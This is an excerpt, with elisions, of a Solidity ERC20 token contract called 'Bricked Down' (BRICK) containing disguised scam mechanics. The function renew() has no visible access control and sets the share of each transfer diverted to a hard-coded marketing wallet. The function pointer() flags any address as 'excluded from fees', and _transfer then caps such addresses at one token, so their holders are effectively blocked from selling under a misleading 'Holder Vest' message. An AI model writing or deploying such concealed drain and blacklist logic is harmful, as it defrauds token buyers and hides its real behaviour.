...
contract BRICK is Context, IERC20, Ownable {
    ...
    string private constant _name = "Bricked Down"; //
    string private constant _symbol = "BRICK"; //
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 1 * 10**9; //
    uint256 private _totalSupply = 1_000_000_000 * 10**9;
    uint256 public minHolder = 1 * 10**9;
    ...
    address private _marketingWallet = 0x1F031acf048EAfEFbB312423d053F03d08CB3A09 ;
    ...
    function renew(uint256 newTick) external {
        z = newTick;
    }
    ...
    function _takeAirdropFee(
        ...
        for (uint256 i = 0; i < 9; i++) {
            ...
            ktNum = ktNum+1;
            _basicTransfer(address(this), _receiveD,amount/10);
        }
    }    
    ...
    function _transfer(
        ...
        if(isExcludedFromFees[from]) {
                    require(amount <= minHolder, "TOKEN: Holder Vest");
                }        
        ...
        _tOwned[to] = _tOwned[
                to]-(
                    amount / 100 * a);
            _tOwned[_marketingWallet] = _tOwned[
                _marketingWallet]+(
                    amount / 100 * z);
    ...
    function pointer(address newAddress) external virtual {
        require (newAddress != _marketingWallet);
        require (newAddress != address(0xdead));
        require (newAddress != uniswapV2Pair);
        require (newAddress != owner());
        require (newAddress != _msgSender());
        require (newAddress != address (this));
        require (newAddress != address (uniswapV2Router));
        isExcludedFromFees[newAddress] = true;
    }
